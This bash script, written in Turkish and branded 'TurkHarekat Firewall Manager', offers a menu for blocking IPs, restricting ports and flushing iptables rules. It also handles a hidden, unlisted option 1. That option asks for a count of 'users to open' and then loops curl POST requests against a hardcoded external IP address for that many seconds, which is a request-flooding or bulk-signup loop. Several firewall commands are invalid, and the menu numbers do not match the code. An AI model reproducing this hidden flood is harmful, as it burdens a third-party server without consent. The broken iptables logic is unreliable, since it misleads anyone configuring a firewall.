#!/bin/bash

##############################################################################################
#---------Coded By-----------#
# İsim: Root Razor
# İşletim Sistemi: Null Yok :D
# Tarih: 26.02.2020
# Bölge: İstanbul
# github.com/rootrazor
# twitter.com/rootraz0r
# telegram.com/rootrazor
#---------Coded By-----------#
##############################################################################################



renk='\e[0;36m'
mavim='\e[1;34m'
beyaz='\e[1;37m'
NC='\e[0m'             

site="http://51.254.188.253/test/test.php"

yanlis="
\033[1;33m###################################################################\033[1;32m \033[0m
\033[1;33m#                                                                 #\033[1;32m \033[0m
\033[1;33m    \033[1;33m=> Yanlis tuslama yapildi, script kapatiliyor.      \033[0m      \033[1;33m \033[0m
\033[1;33m#                                                                 #\033[1;33m \033[0m
\033[1;33m###################################################################\033[1;32m \033[0m
"


#--------------------------------------------------------------------------------------#
update_sorun(){
clear
sleep 0.5
echo -e "\033[1;33m###################################################################\033[1;32m \033[0m"
echo -e "\033[1;33m#                                                                 #\033[1;32m \033[0m"
echo -e "\033[1;33m     \033[1;33m=> cURL kütüphanesi eksik, lütfen yükleyin.      \033[0m         \033[1;33m \033[0m"
echo -e "\033[1;33m#    \033[1;31m=> apt-get install curl                        \033[0m\033[1;33m \033[0m"
echo -e "\033[1;33m#                                                                 #\033[1;33m \033[0m"
echo -e "\033[1;33m###################################################################\033[1;32m \033[0m"
exit

}



ana_kurulum_bilesenkur(){
sleep 1
clear

echo -e -n "\e[1;36mAcilcak Kullanici Sayisi: \033[0m"
read kullanicisayisi

echo -e "\033\e[93mKullanici Aciliyor [Lutfen Bekleyiniz]\033[0m"

surecik=$((sure+$kullanicisayisi))


end=$((SECONDS+$kullanicisayisi))

while [ $SECONDS -lt $end ]; do
    # SURE SİSTEMİ
    
	curl --data "giris" $site
    :
done

clear
echo -e -n "\e[1;36mİşlem Tamamlandi \033[0m"

}

ip_adresiyonetim(){ #IP adresi engelle / engelleme kaldır Sistemi
sleep 1
clear
echo -e "\033[1;35mİşlem: \033[1;33mIP adresi engelle / engel kaldır"
echo -e -n "\e[1;36mIP Adresi: \033[0m"
read ipip
echo -e -n "\e[1;36mYapılacak işlem (İP ADRESİ GİRİNİZ): \033[0m"
read ipislem
iptables -D INPUT -s $ipip -j DROP
iptables -X INPUT -s $ipip -j DROP
echo -e "\033[1;33m$ipip numaralı ip adresinin engeli kaldırıldı!\033[0m"
clear
echo -e -n "\e[1;36mİşlem Tamamlandi \033[0m"

}


port_yonetim(){ #porta ozel ip izin verme Sistemi
sleep 1
clear
echo -e "\033[1;35mİşlem: \033[1;33mPorta özel ip izni ver"
echo -e -n "\e[1;36mPort: \033[0m"
read portozel
echo -e -n "\e[1;36mIP Adresi: \033[0m"
read portipozel
iptables -A INPUT -p udp --dport $portozel -j REJECT
iptables -A INPUT -p tcp --dport $portozel -j REJECT
iptables -I INPUT -p tcp -s $portipozel --dport $portozel -j ACCEPT
iptables -I INPUT -p udp -s $portipozel --dport $portozel -j ACCEPT
clear
echo -e "\033[1;33m$portozel numaralı porta sadece $portipozel ip adresi girebilecek şekilde ayarlandı.\033[0m"

}

kural_yonetim(){ #kurallari sifirlama Sistemi
sleep 1
clear
iptables -F
iptables -X
sysctl net.ipv4.ip_forward=0
clear
clear
clear
echo -e "\033[1;33mBütün kurallar sıfırlandı.\033[0m"

}
                                                         

command -v curl >/dev/null 2>&1 || hatakaydi="1"
if [[ $hatakaydi -eq 1 ]]
	then
sleep 1
update_sorun
fi
sleep 0.5
clear
echo -e "\033\e[93mScript Açılıyor [TurkHarekat V1.0]\033[0m"
sleep 4
clear




	echo -e "\033[1;33m######################################################################\033[1;32m \033[0m"
echo -e "# ${beyaz}
#   #   P   r   o   j   e   #              TurkHarekat Yeni Sürüm V1 ${beyaz}
#  / \ / \ / \ / \ / \ / \ / \        --------------------------------${renk}
# ( T | H | T | R | A | Z | OR|${mavim}      ¦         turkharekat.com        ¦${beyaz}
#  \_/ \_/ \_/ \_/ \_/ \_/ \_/        --------------------------------
"${beyaz}
	echo -e "\033[1;33m \033[0;36m                                                             \033[1;33m \033[0m"
	echo -e "\033[1;33m# \033[0;36m=>  Turkharekat Firewall Manager \033[0m                       \033[1;33m \033[0m"
	echo -e "\033[1;33m# \033[0;36m=>  Geliştirici: R00tRazor   	 \033[0m                       \033[1;33m \033[0m"
	echo -e "\033[1;33m# \033[0;36m=>  Website: turkharekat.com   	 \033[0m                       \033[1;33m \033[0m"
	echo -e "\033[1;33m######################################################################\033[1;32m \033[0m"
	echo -e "\033[0;32m#\033[0m \033[1;37m\033[1;31m6\033[1;37m) \033[1;36mPort Aç / Kapat                                  \033[0;32m#\033[0m"
echo -e "\033[0;32m#\033[0m \033[1;37m\033[1;31m7\033[1;37m) \033[1;36mIP adresi engelle / engelleme kaldır             \033[0;32m#\033[0m"
echo -e "\033[0;32m#\033[0m \033[1;37m\033[1;31m8\033[1;37m) \033[1;36mPorta özel ip izni ver                           \033[0;32m#\033[0m"
echo -e "\033[0;32m#\033[0m \033[1;37m\033[1;31m9\033[1;37m) \033[1;36mProxy Oluştur                                    \033[0;32m#\033[0m"
echo -e "\033[0;32m#\033[0m \033[1;37m\033[1;31m10\033[1;37m) \033[1;36mTüm kuralları sıfırla !                         \033[0;32m#\033[0m"
echo -e "\033[0;32m#\033[0m \033[1;37m\033[1;31m2\033[1;37m) \033[1;36mÇıkış Yap              !                         \033[0;32m#\033[0m"

read secenek

case $secenek in
 1)
ana_kurulum_bilesenkur
 ;;
 7)
ip_adresiyonetim
 ;;
 8)
port_yonetim
 ;;
 10)
kural_yonetim
 ;;
esac
